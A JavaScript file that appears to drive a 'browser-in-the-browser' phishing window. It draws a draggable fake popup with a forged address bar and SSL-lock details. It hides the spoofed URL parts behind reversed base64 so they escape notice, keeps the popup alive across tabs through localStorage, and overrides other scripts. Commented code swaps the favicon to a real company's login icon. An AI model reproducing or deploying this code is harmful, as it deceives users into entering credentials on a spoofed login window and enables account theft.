




// URL part

const PREFIX = "OBFS";
const SUFFIX = "END";

function deobfPart(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split('').reverse().join('');
  return atob(reversed);
}



function openTop() {
        $("#bb-win").css('display', "block");
        // $("#bb-win").css('opacity', "1");
        $("#bb-win-back").css('display', "block");
        // $("#bb-win-back").css('opacity', "1");
        deObfData();
        applyPositioning();
}

function openIn(){

        var checkExist = setInterval(function() {
      
        if ($('.win-scroll').length) {
                $(".win-scroll").css('display', "block");
                applyPositioning();

        
              // Set up a short duration recheck to combat other scripts
              var recheckDuration = 1000;  // 3 seconds
              var recheckStart = Date.now();
              var recheckInterval = setInterval(function() {
                 if (Date.now() - recheckStart > recheckDuration) {
                     clearInterval(recheckInterval);
                     return;
                 }
                $(".win-scroll").css('display', "block");
                applyPositioning();
              }, 50);  // recheck every 100 milliseconds
        
              clearInterval(checkExist);
          }
        }, 50);
}

// Set up an interval to check for the existence of win-scroll
var openedAlready = localStorage.getItem('bb-open');
var doneAlready = localStorage.getItem('bb-done');

if (openedAlready === "true" && !doneAlready){
    openTop();
    openIn();
} 



window.addEventListener('storage', function(e) {
    // e.key is the key of the storage item that changed
    // e.oldValue is the old value of the item
    // e.newValue is the new value of the item
    // e.url is the URL of the page that made the change

    if (e.storageArea === localStorage) {
        // Check if the change was in localStorage
        // (could also be sessionStorage)

        // console.log('Local storage item with key:', e.key, 'changed from', e.oldValue, 'to', e.newValue);

        // Call the function you want to trigger
        var doneAlready = localStorage.getItem('bb-done');
        if (e.key === "bb-open" && e.newValue === "true" && !doneAlready){
            
            openTop();
            openIn();
        }
        
        
        
    }
});

function deObfData() {


    try{
        // Bar
        document.getElementById('d-s').innerText = deobfPart(document.getElementById('d-s').innerText) + "//";
        document.getElementById('d-n').innerText = deobfPart(document.getElementById('d-n').innerText);
        document.getElementById('d-p').innerText = "/" + deobfPart(document.getElementById('d-p').innerText);
        
  
        // Rest
        document.getElementById('lg-d').innerText = deobfPart(document.getElementById('lg-d').innerText);
  
        document.getElementById('ss-l-h-d').innerText = deobfPart(document.getElementById('ss-l-h-d').innerText);
        document.getElementById('ss-l-t1').innerText = deobfPart(document.getElementById('ss-l-t1').innerText);
        document.getElementById('ss-l-t2').innerText = deobfPart(document.getElementById('ss-l-t2').innerText);
        document.getElementById('ss-l-t3').innerText = deobfPart(document.getElementById('ss-l-t3').innerText);
  
    } catch {
        // Already obfuscated
        return;
    }
  
}






var titleBar = document.getElementById("t-b");
var exit = document.getElementById("es-c");
var max = document.getElementById("ma-x");
var min = document.getElementById("mi-n");



titleBar.addEventListener('dblclick', function handleMouseOver() {
    enlarge();
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:


var draggable = $('#bb-win');
var winScroll = $('.win-scroll');
var title = $('#t-b');

title.on('mousedown', function(e) {
    var dr = $(draggable).addClass("drag");
    var db = $('#bb-win-back');
    var dt = $('.win-scroll').addClass("drag");
    
    var initialDiffX = dt.offset().left - dr.offset().left;
    var initialDiffY = dt.offset().top - dr.offset().top;
    
    var ypos = e.pageY - dr.offset().top;
    var xpos = e.pageX - dr.offset().left;

    $(document.body).on('mousemove', function(e) {
        var itop = e.pageY - ypos;
        var ileft = e.pageX - xpos;

        if(dr.hasClass("drag")) {
            dr.offset({top: itop, left: ileft});
            db.offset({top: itop, left: ileft});
        }
        
        if(dt.hasClass("drag")) {
            dt.offset({top: itop + initialDiffY, left: ileft + initialDiffX});
        }
    }).on('mouseup', function(e) {
        dr.removeClass("drag");
        dt.removeClass("drag");

    var btbPosition = {
        top: dr.offset().top,
        left: dr.offset().left,
        width: dr.css('width'),
        height: dr.css('height'),
        enlarged: dr.hasClass('enlarged')
    };
    localStorage.setItem('bb-win-position', JSON.stringify(btbPosition));

    var winScrollOffset = {
        top: dt.offset().top - dr.offset().top,
        left: dt.offset().left - dr.offset().left
    };
    localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));


    });
});


// Function to apply positioning
function applyPositioning() {
    var storedBtbPosition = localStorage.getItem('bb-win-position');
    var storedWinScrollOffset = localStorage.getItem('win-scroll-offset');

    if(storedBtbPosition && storedWinScrollOffset) {
        var btbPosition = JSON.parse(storedBtbPosition);
        var winOffset = JSON.parse(storedWinScrollOffset);
        
        if (btbPosition.enlarged === "true"){
            $("#ma-x").addClass("enlarged");
        }


        $("#bb-win").css('width', btbPosition.width);
        $("#bb-win").css('height', btbPosition.height);
        $("#bb-win-back").css('width', btbPosition.width);
        $("#bb-win-back").css('height', btbPosition.height);

        var winScrollTop = btbPosition.top + winOffset.top;
        var winScrollLeft = btbPosition.left + winOffset.left;

        $("#bb-win").offset({
            top: btbPosition.top,
            left: btbPosition.left
        });
        $("#bb-win-back").offset({
           top: btbPosition.top,
            left: btbPosition.left
      });
        $(".win-scroll").offset({
            top: winScrollTop,
            left: winScrollLeft
        });
 
    }
}



////////////////// Onclick listeners //////////////////
// X button functionality


$("#es-c").click(function(){
    $("#bb-win").css("display", "none");
    $("#bb-win-back").css("display", "none");
    $(".win-scroll").css("display", "none");
    $("#ss-l-p0p").removeClass("visible");
    localStorage.setItem('bb-open', false);
    localStorage.removeItem('bb-win-position');
    localStorage.removeItem('win-scroll-offset');
});

$("#ss-l-pad").click(toggleSSLPopup);
$("#ss-l-close").click(toggleSSLPopup);

function toggleSSLPopup(){
    var sslPopup = $("#ss-l-p0p");
    if (sslPopup.hasClass("visible")){
        sslPopup.removeClass("visible")
    } else (
        sslPopup.addClass("visible")
    )
  }



// ma-x button functionality
$("#ma-x").click(enlarge);


function enlarge(){
  if(max.classList.contains("enlarged")){
    $("#bb-win").css("width", "40vw");
    $("#bb-win").css("height", "81vh");
    $("#bb-win-back").css("width", "40vw");
    $("#bb-win-back").css("height", "81vh");
    $("#t-b-width").css('width', '100%').css('width', '+=2px');
    $("#enc-o-cont").css("width", "100%");
    $("#ma-x").removeClass("enlarged");
  }
  else{
    $("#bb-win").css("width", "70vw");
    $("#bb-win").css("height", "81vh");
    $("#bb-win-back").css("width", "70vw");
    $("#bb-win-back").css("height", "81vh");
    $("#t-b-width").css('width', '100%').css('width', '+=2px');
    $("#enc-o-cont").css("width", "100%");
    $("#ma-x").addClass("enlarged");
    
  }
  
    var dr = $("#bb-win");
    var dt = $(".win-scrol");
    
    var btbPosition = {
        top: dr.offset().top,
        left: dr.offset().left,
        width: dr.css('width'),
        height: dr.css('height'),
        enlarged: dr.hasClass('enlarged')
    };
    localStorage.setItem('bb-win-position', JSON.stringify(btbPosition));
  
    var winScrollOffset = {
        top: dt.offset().top - dr.offset().top,
        left: dt.offset().left - dr.offset().left
    };
    localStorage.setItem('win-scroll-offset', JSON.stringify(winScrollOffset));
  
}








// function changeFavicon(src) {
//     var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
//     link.type = 'image/x-icon';
//     link.rel = 'shortcut icon';
//     link.href = src;
//     document.getElementsByTagName('head')[0].appendChild(link);
// }

// document.addEventListener("DOMContentLoaded", function() {
//     // Your page has loaded
//     changeFavicon('https://login.etech-it.com/landing/images/favicon.ico');


//     var checkExist = setInterval(function() {
      
//         if (document.querySelector("link[rel*='icon']")) {
//             changeFavicon('https://login.etech-it.com/landing/images/favicon.ico');

        
//               // Set up a short duration recheck to combat other scripts
//               var recheckDuration = 9000;  // 9 seconds
//               var recheckStart = Date.now();
//               var recheckInterval = setInterval(function() {
//                  if (Date.now() - recheckStart > recheckDuration) {
//                      clearInterval(recheckInterval);
//                      return;
//                  }
//                  changeFavicon('https://login.etech-it.com/landing/images/favicon.ico');
//               }, 50);  // recheck every 100 milliseconds
        
//               clearInterval(checkExist);
//           }
//         }, 50);
// });



// // FOR POISITIONING ISSUES

// $(document).ready(function() {
//     adjustPopupHeight();

//     // If there are dynamic elements that might change the height, you can also listen for mutations
//     const observer = new MutationObserver(adjustPopupHeight);
//     observer.observe(document.querySelector('.win-scroll'), { childList: true, subtree: true });
// });

// function adjustPopupHeight() {
//     const winScrollHeight = $('.win-scroll').outerHeight(true);
//     const btbTopBarHeight = $('#t-b-o').outerHeight(true);
//     const newPopupHeight = winScrollHeight + btbTopBarHeight + 40; // Adding 40 for potential padding or margin

//     $('#bb-win').height(newPopupHeight);
//     $('#bb-win-back').height(newPopupHeight);
// }










